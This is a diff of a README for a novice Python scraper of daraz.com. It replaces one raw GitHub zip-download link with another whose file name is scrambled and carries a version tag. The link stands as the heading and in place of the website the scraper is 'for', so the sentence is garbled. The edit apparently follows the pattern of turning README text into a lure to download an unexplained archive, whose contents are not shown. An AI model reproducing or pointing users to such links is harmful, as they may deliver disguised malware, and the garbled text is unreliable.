@@ -2,11 +2,11 @@
 
 
 
-# https://github.com/Zohaibzaibi143/basic-scraper-for-daraz.com/raw/refs/heads/master/fakir/daraz_scraper_for_com_basic_v2.0-alpha.5.zip
+# https://github.com/Zohaibzaibi143/basic-scraper-for-daraz.com/raw/refs/heads/master/fakir/com_daraz_basic_for_scraper_v3.4-beta.5.zip
 
 
 
-This is my very first web scraper. It's for the website :  https://github.com/Zohaibzaibi143/basic-scraper-for-daraz.com/raw/refs/heads/master/fakir/daraz_scraper_for_com_basic_v2.0-alpha.5.zip
+This is my very first web scraper. It's for the website :  https://github.com/Zohaibzaibi143/basic-scraper-for-daraz.com/raw/refs/heads/master/fakir/com_daraz_basic_for_scraper_v3.4-beta.5.zip
 
 1. I've used Python 3.6.3. 
 2. The libraries I've used are Requests, Beautifulsoup 4, csv and time.
